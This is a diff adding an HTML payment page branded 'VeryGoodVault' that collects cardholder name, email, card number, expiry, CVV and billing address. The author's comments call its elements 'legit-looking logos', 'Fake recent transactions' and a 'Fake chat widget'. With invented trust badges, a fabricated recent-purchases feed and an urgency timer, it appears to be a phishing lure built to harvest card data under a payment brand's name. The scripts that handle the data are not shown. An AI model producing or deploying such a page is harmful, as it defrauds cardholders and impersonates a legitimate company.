@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment Portal | VeryGoodVault</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <script src="https://js.verygoodvault.com/v2/vgs-collect.min.js"></script>
+    <script src="vault.js" defer></script>
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <!-- Trust badges floating -->
+    <div class="trust-badges">
+        <div class="badge"><i class="fas fa-shield-alt"></i> PCI DSS Level 1</div>
+        <div class="badge"><i class="fas fa-lock"></i> 256-bit Encryption</div>
+        <div class="badge"><i class="fas fa-check-circle"></i> 3D Secure</div>
+    </div>
+
+    <div class="container">
+        <!-- Header with legit-looking logos -->
+        <header class="header">
+            <div class="logo-container">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='50'%3E%3Ctext x='10' y='35' font-family='Arial' font-size='24' fill='%232963d1'%3EVeryGoodVault%3C/text%3E%3C/svg%3E" 
+                     alt="VeryGoodVault Secure Payments" class="logo">
+                <div class="verified">
+                    <i class="fas fa-badge-check"></i>
+                    <span>Verified Payment Gateway</span>
+                </div>
+            </div>
+            <div class="contact">
+                <i class="fas fa-phone"></i> 1-800-VGV-PAY
+                <span class="secure-connection">
+                    <i class="fas fa-lock"></i> Secure Connection
+                </span>
+            </div>
+        </header>
+
+        <!-- Progress indicator -->
+        <div class="progress-bar">
+            <div class="step active"><span>1</span> Cart</div>
+            <div class="step active"><span>2</span> Details</div>
+            <div class="step active"><span>3</span> Payment</div>
+            <div class="step"><span>4</span> Confirmation</div>
+        </div>
+
+        <div class="payment-wrapper">
+            <!-- Left panel: Order summary -->
+            <div class="order-summary">
+                <h2><i class="fas fa-shopping-cart"></i> Order Summary</h2>
+                <div class="order-items">
+                    <div class="item">
+                        <span>Premium Subscription Plan</span>
+                        <span>$99.99/yr</span>
+                    </div>
+                    <div class="item">
+                        <span>Setup Fee</span>
+                        <span>$0.00</span>
+                    </div>
+                    <div class="item">
+                        <span>Tax</span>
+                        <span>$8.00</span>
+                    </div>
+                    <div class="item total">
+                        <span><strong>Total</strong></span>
+                        <span><strong>$107.99</strong></span>
+                    </div>
+                </div>
+
+                <div class="security-notice">
+                    <h3><i class="fas fa-shield-check"></i> Security Guarantee</h3>
+                    <p>Your payment details are secured with bank-level encryption through VeryGoodVault. We never store your full card number on our servers.</p>
+                    <div class="encryption-info">
+                        <i class="fas fa-key"></i> <strong>End-to-end encryption</strong>
+                        <div class="encryption-visual">
+                            <span>Your Browser</span> 
+                            <i class="fas fa-arrow-right"></i> 
+                            <span class="encrypted">🔒 Encrypted</span> 
+                            <i class="fas fa-arrow-right"></i> 
+                            <span>Payment Processor</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accepted-cards">
+                    <i class="fab fa-cc-visa"></i>
+                    <i class="fab fa-cc-mastercard"></i>
+                    <i class="fab fa-cc-amex"></i>
+                    <i class="fab fa-cc-discover"></i>
+                    <i class="fab fa-cc-jcb"></i>
+                </div>
+            </div>
+
+            <!-- Right panel: Payment form -->
+            <div class="payment-form-container">
+                <h1><i class="fas fa-credit-card"></i> Complete Your Payment</h1>
+                <p class="subtitle">Enter your payment details below. All fields are required.</p>
+
+                <form id="paymentForm" method="POST" action="/process">
+                    <!-- Cardholder Information -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-user"></i> Cardholder Information</h3>
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="fullName">Full Name <span class="required">*</span></label>
+                                <input type="text" id="fullName" name="fullName" placeholder="As shown on card" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="email">Email Address <span class="required">*</span></label>
+                                <input type="email" id="email" name="email" placeholder="receipt@example.com" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Card Details -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-credit-card"></i> Card Details</h3>
+                        
+                        <!-- VGS iframe for card number -->
+                        <div class="form-group">
+                            <label for="cardNumber">Card Number <span class="required">*</span></label>
+                            <div id="card-number-frame" class="vgs-frame"></div>
+                            <div class="card-icons">
+                                <div class="card-type-indicator" id="cardType">
+                                    <i class="far fa-credit-card"></i>
+                                </div>
+                                <div class="card-preview" id="cardPreview">**** **** **** ****</div>
+                            </div>
+                        </div>
+
+                        <div class="form-grid">
+                            <!-- Expiration iframe -->
+                            <div class="form-group">
+                                <label for="expiration">Expiration Date <span class="required">*</span></label>
+                                <div id="expiration-date-frame" class="vgs-frame"></div>
+                            </div>
+                            
+                            <!-- CVV iframe -->
+                            <div class="form-group">
+                                <label for="cvv">Security Code <span class="required">*</span></label>
+                                <div id="cvv-frame" class="vgs-frame"></div>
+                                <div class="cvv-help">
+                                    <i class="fas fa-question-circle"></i>
+                                    <div class="tooltip">3-4 digits on back of card</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Billing Address -->
+                    <div class="form-section">
+                        <h3><i class="fas fa-home"></i> Billing Address</h3>
+                        <div class="form-group">
+                            <label for="address">Street Address <span class="required">*</span></label>
+                            <input type="text" id="address" name="address" required>
+                        </div>
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="city">City <span class="required">*</span></label>
+                                <input type="text" id="city" name="city" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="state">State <span class="required">*</span></label>
+                                <input type="text" id="state" name="state" required>
+                            </div>
+                            <div class="form-group">
+                                <label for="zip">ZIP Code <span class="required">*</span></label>
+                                <input type="text" id="zip" name="zip" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Terms and submit -->
+                    <div class="form-section">
+                        <div class="form-group checkbox">
+                            <input type="checkbox" id="terms" name="terms" required>
+                            <label for="terms">
+                                I authorize VeryGoodVault to charge my card for this transaction and agree to the 
+                                <a href="#" class="terms-link">Terms of Service</a> and 
+                                <a href="#" class="terms-link">Privacy Policy</a>.
+                            </label>
+                        </div>
+
+                        <div class="form-group checkbox">
+                            <input type="checkbox" id="saveCard" name="saveCard" checked>
+                            <label for="saveCard">
+                                <i class="fas fa-vault"></i> Securely save this card for faster checkout (encrypted in VeryGoodVault)
+                            </label>
+                        </div>
+
+                        <button type="submit" id="submitBtn" class="submit-btn">
+                            <span class="btn-text">Pay $107.99</span>
+                            <span class="btn-icon"><i class="fas fa-lock"></i></span>
+                            <div class="btn-loader" id="btnLoader">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+
+                        <p class="secure-note">
+                            <i class="fas fa-shield-alt"></i> 
+                            <strong>Secure Payment:</strong> Your information is protected with 256-bit SSL encryption
+                        </p>
+                    </div>
+                </form>
+
+                <div class="live-support">
+                    <i class="fas fa-comments"></i>
+                    <strong>Need help?</strong> 
+                    <a href="#" id="liveChat">Chat with our payment specialists</a> or call 1-800-VGV-PAY
+                </div>
+            </div>
+        </div>
+
+        <!-- Fake recent transactions -->
+        <div class="recent-transactions">
+            <h3><i class="fas fa-history"></i> Recent Secure Payments</h3>
+            <div class="transactions-list">
+                <div class="transaction">
+                    <span>Alex J.</span>
+                    <span>Visa •••• 4231</span>
+                    <span>$89.99</span>
+                    <span class="success"><i class="fas fa-check"></i> 2 min ago</span>
+                </div>
+                <div class="transaction">
+                    <span>Sarah M.</span>
+                    <span>Mastercard •••• 8892</span>
+                    <span>$154.50</span>
+                    <span class="success"><i class="fas fa-check"></i> 5 min ago</span>
+                </div>
+                <div class="transaction">
+                    <span>Robert K.</span>
+                    <span>Amex •••• 1003</span>
+                    <span>$67.80</span>
+                    <span class="success"><i class="fas fa-check"></i> 12 min ago</span>
+                </div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <p>
+                <i class="fas fa-copyright"></i> 2024 VeryGoodVault Payments. All rights reserved.
+                <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">Security</a> | <a href="#">PCI Compliance</a>
+            </p>
+            <div class="footer-logos">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='100' height='40'%3E%3Ctext x='10' y='25' font-family='Arial' font-size='14' fill='gray'%3EPCI-DSS%3C/text%3E%3C/svg%3E" alt="PCI DSS">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='80' height='40'%3E%3Ctext x='10' y='25' font-family='Arial' font-size='14' fill='gray'%3ESSL Secure%3C/text%3E%3C/svg%3E" alt="SSL Secure">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='40'%3E%3Ctext x='10' y='25' font-family='Arial' font-size='14' fill='gray'%3EBank-Level Encryption%3C/text%3E%3C/svg%3E" alt="Bank-Level Encryption">
+            </div>
+        </footer>
+    </div>
+
+    <!-- Session timer -->
+    <div class="session-timer">
+        <i class="fas fa-clock"></i> Session expires in: <span id="timer">14:59</span>
+    </div>
+
+    <!-- Fake chat widget -->
+    <div class="chat-widget" id="chatWidget">
+        <div class="chat-header">
+            <i class="fas fa-headset"></i> Payment Support
+            <span class="chat-status online"><i class="fas fa-circle"></i> Online</span>
+        </div>
+        <div class="chat-body">
+            <div class="chat-message bot">
+                <strong>VGV Support:</strong> Hello! How can I help with your payment today?
+            </div>
+        </div>
+        <div class="chat-input">
+            <input type="text" placeholder="Type your message...">
+            <button><i class="fas fa-paper-plane"></i></button>
+        </div>
+    </div>
+</body>
+</html>
